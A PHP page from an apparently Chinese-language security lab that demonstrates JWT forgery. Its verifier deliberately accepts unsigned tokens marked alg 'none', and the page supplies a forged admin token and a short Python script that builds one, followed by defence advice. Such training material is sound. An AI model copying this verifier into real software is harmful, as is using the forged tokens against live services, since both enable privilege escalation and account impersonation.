<?php
$module_name = '令牌伪造攻击';
$module_icon = '🎭';
$module_desc = '演示JWT令牌伪造攻击场景。';

session_start();

$message = '';
$error = '';
$success = false;

if (isset($_GET['reset'])) {
    $_SESSION['jwt_user'] = [
        'sub' => 'user123',
        'username' => 'normaluser',
        'role' => 'user',
        'iat' => time()
    ];
    header('Location: 03_token_forgery.php');
    exit;
}

if (!isset($_SESSION['jwt_user'])) {
    $_SESSION['jwt_user'] = [
        'sub' => 'user123',
        'username' => 'normaluser',
        'role' => 'user',
        'iat' => time()
    ];
}

$secretKey = 'jwt_forgery_secret_key';

function base64UrlEncode($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64UrlDecode($data) {
    return base64_decode(strtr($data, '-_', '+/'));
}

function createJWT($payload, $key) {
    $header = ['alg' => 'HS256', 'typ' => 'JWT'];
    $headerEncoded = base64UrlEncode(json_encode($header));
    $payloadEncoded = base64UrlEncode(json_encode($payload));
    $signature = hash_hmac('sha256', $headerEncoded . '.' . $payloadEncoded, $key, true);
    return $headerEncoded . '.' . $payloadEncoded . '.' . base64UrlEncode($signature);
}

function verifyJWT($token, $key) {
    $parts = explode('.', $token);
    if (count($parts) !== 3) {
        return [false, 'Invalid token format'];
    }
    
    $header = json_decode(base64UrlDecode($parts[0]), true);
    $payload = json_decode(base64UrlDecode($parts[1]), true);
    
    if (!$header || !$payload) {
        return [false, 'Invalid token structure'];
    }
    
    $alg = strtolower($header['alg'] ?? '');
    
    if ($alg === 'none' || $alg === 'null') {
        return [true, $payload];
    }
    
    if ($alg === 'hs256') {
        $expected = hash_hmac('sha256', $parts[0] . '.' . $parts[1], $key, true);
        if (hash_equals($expected, base64UrlDecode($parts[2]))) {
            return [true, $payload];
        }
        return [false, 'Invalid signature'];
    }
    
    return [false, 'Unsupported algorithm'];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
    $token = trim($_POST['token']);
    list($valid, $result) = verifyJWT($token, $secretKey);
    
    if ($valid && is_array($result)) {
        $_SESSION['jwt_user'] = $result;
        if (isset($result['role']) && $result['role'] === 'admin') {
            $success = true;
            $message = '🎉 攻击成功！你已成功伪造管理员令牌获取管理员权限！';
        } else {
            $message = '令牌验证成功，当前用户：' . htmlspecialchars($result['username'] ?? 'unknown');
        }
    } else {
        $error = '令牌验证失败：' . htmlspecialchars($result);
    }
}

$currentToken = createJWT($_SESSION['jwt_user'], $secretKey);

$header = json_decode(base64UrlDecode(explode('.', $currentToken)[0]), true);
$payload = json_decode(base64UrlDecode(explode('.', $currentToken)[1]), true);

$content = '<div class="card">
    <div class="card-header">
        <h5 class="mb-0">🎭 令牌伪造攻击</h5>
    </div>
    <div class="card-body">
        <div class="alert alert-danger">
            <strong>💡 漏洞说明：</strong><br>
            本场景演示JWT令牌伪造攻击。服务器存在多个漏洞：支持None算法、未严格验证签名算法。攻击者可以通过修改Payload中的声明来提升权限或冒充其他用户。
        </div>

        <div class="mb-3 text-center">
            <a href="?reset" class="btn btn-warning">重置环境</a>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🔄 攻击方式</h6>
            </div>
            <div class="card-body">
                <div class="bg-light p-3 rounded border mb-3">
                    <script src="../assets/js/mermaid.min.js"></script>
                    <div class="mermaid">
                        flowchart TD
                            A[获取JWT令牌] --> B{选择攻击方式}
                            B --> C[None算法攻击]
                            B --> D[Payload篡改]
                            C --> E[修改alg为none]
                            E --> F[删除签名]
                            D --> G[修改用户信息]
                            G --> H[重新签名]
                            F --> I[提交伪造令牌]
                            H --> I
                            I --> J[获取管理员权限]
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🎫 当前用户令牌</h6>
            </div>
            <div class="card-body">
                <div class="alert alert-info">
                    <strong>当前用户：</strong>' . htmlspecialchars($_SESSION['jwt_user']['username']) . '<br>
                    <strong>角色：</strong>' . htmlspecialchars($_SESSION['jwt_user']['role']) . '
                </div>
                <pre class="bg-dark text-light p-3 rounded" style="word-break: break-all;"><code>' . htmlspecialchars($currentToken) . '</code></pre>
                
                <div class="mt-3">
                    <strong>解码后的Header：</strong>
                    <pre class="bg-light p-2 rounded"><code>' . htmlspecialchars(json_encode($header, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) . '</code></pre>
                </div>
                <div class="mt-2">
                    <strong>解码后的Payload：</strong>
                    <pre class="bg-light p-2 rounded"><code>' . htmlspecialchars(json_encode($payload, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) . '</code></pre>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🔧 JWT构造工具</h6>
            </div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-4">
                        <div class="mb-3">
                            <label class="form-label">Header</label>
                            <textarea id="jwt-header" class="form-control" rows="4">{
    "alg": "HS256",
    "typ": "JWT"
}</textarea>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="mb-3">
                            <label class="form-label">Payload</label>
                            <textarea id="jwt-payload" class="form-control" rows="4">{
    "sub": "user123",
    "username": "normaluser",
    "role": "user"
}</textarea>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="mb-3">
                            <label class="form-label">签名密钥（可选）</label>
                            <input type="text" id="jwt-key" class="form-control" placeholder="留空则不签名">
                        </div>
                        <button type="button" class="btn btn-primary w-100" onclick="generateJWT()">生成JWT</button>
                    </div>
                </div>
                <div class="mt-3">
                    <label class="form-label">生成的JWT：</label>
                    <textarea id="jwt-result" class="form-control" rows="2" readonly></textarea>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🎯 攻击演示</h6>
            </div>
            <div class="card-body">
                <form method="POST">
                    <div class="mb-3">
                        <label for="token" class="form-label">提交伪造的JWT令牌：</label>
                        <textarea name="token" id="token" class="form-control" rows="2" placeholder="粘贴你伪造的JWT令牌..."></textarea>
                    </div>
                    <button type="submit" class="btn btn-danger">提交令牌</button>
                </form>

                ' . ($success ? '<div class="alert alert-success mt-3">' . $message . '</div>' : '') . '
                ' . ($message && !$success ? '<div class="alert alert-info mt-3">' . $message . '</div>' : '') . '
                ' . ($error ? '<div class="alert alert-danger mt-3">' . $error . '</div>' : '') . '

                <div class="mt-4">
                    <h6>💡 攻击提示</h6>
                    <div class="accordion" id="attackTips">
                        <div class="card">
                            <div class="card-header" id="tip1">
                                <h2 class="mb-0">
                                    <button class="btn btn-link btn-block text-left" type="button" data-toggle="collapse" data-target="#collapseTip1">
                                        方法1：None算法攻击
                                    </button>
                                </h2>
                            </div>
                            <div id="collapseTip1" class="collapse show" data-parent="#attackTips">
                                <div class="card-body">
                                    <ol>
                                        <li>将Header中的alg改为<strong>"none"</strong></li>
                                        <li>将Payload中的role改为<strong>"admin"</strong></li>
                                        <li>删除签名部分（只保留两个点）</li>
                                        <li>提交伪造的令牌</li>
                                    </ol>
                                    <pre class="bg-dark text-light p-2 rounded"><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInVzZXJuYW1lIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.</code></pre>
                                </div>
                            </div>
                        </div>
                        <div class="card">
                            <div class="card-header" id="tip2">
                                <h2 class="mb-0">
                                    <button class="btn btn-link btn-block text-left collapsed" type="button" data-toggle="collapse" data-target="#collapseTip2">
                                        方法2：修改用户ID
                                    </button>
                                </h2>
                            </div>
                            <div id="collapseTip2" class="collapse" data-parent="#attackTips">
                                <div class="card-body">
                                    <p>修改Payload中的sub或username字段，尝试冒充其他用户。</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="mt-4">
                    <h6>🐍 Python攻击脚本</h6>
                    <pre class="bg-dark text-light p-3 rounded"><code>import base64
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

# None算法攻击
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "username": "attacker", "role": "admin"}

token = base64url_encode(header) + "." + base64url_encode(payload) + "."
print("None算法令牌:", token)</code></pre>
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-header">
                <h6>🛡️ 防御建议</h6>
            </div>
            <div class="card-body">
                <ol>
                    <li><strong>禁用None算法：</strong>拒绝alg为none的令牌</li>
                    <li><strong>白名单算法：</strong>只允许预期的签名算法</li>
                    <li><strong>验证签名：</strong>始终验证JWT签名</li>
                    <li><strong>验证声明：</strong>检查exp、nbf、iat等时间声明</li>
                    <li><strong>使用安全库：</strong>使用成熟的JWT库</li>
                </ol>
                <pre class="bg-dark text-light p-3 rounded"><code>// 安全的JWT验证
$allowedAlgorithms = ["HS256"];
$header = json_decode(base64_decode($parts[0]), true);

// 禁止None算法
if (strtolower($header["alg"]) === "none") {
    throw new Exception("Algorithm not allowed");
}

// 使用白名单验证
$decoded = Firebase\JWT\JWT::decode($token, $key, $allowedAlgorithms);</code></pre>
            </div>
        </div>
    </div>
</div>

<script>
function base64UrlEncode(str) {
    return btoa(str).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function generateJWT() {
    try {
        const header = document.getElementById("jwt-header").value;
        const payload = document.getElementById("jwt-payload").value;
        const key = document.getElementById("jwt-key").value;
        
        const headerEncoded = base64UrlEncode(header);
        const payloadEncoded = base64UrlEncode(payload);
        
        let token = headerEncoded + "." + payloadEncoded;
        
        if (key) {
            // 简单示例，实际签名需要服务端支持
            token += ".[需要服务端签名]";
        } else {
            token += ".";
        }
        
        document.getElementById("jwt-result").value = token;
    } catch (e) {
        alert("JSON格式错误: " + e.message);
    }
}
</script>';

include '../template/module_template.php';
?>
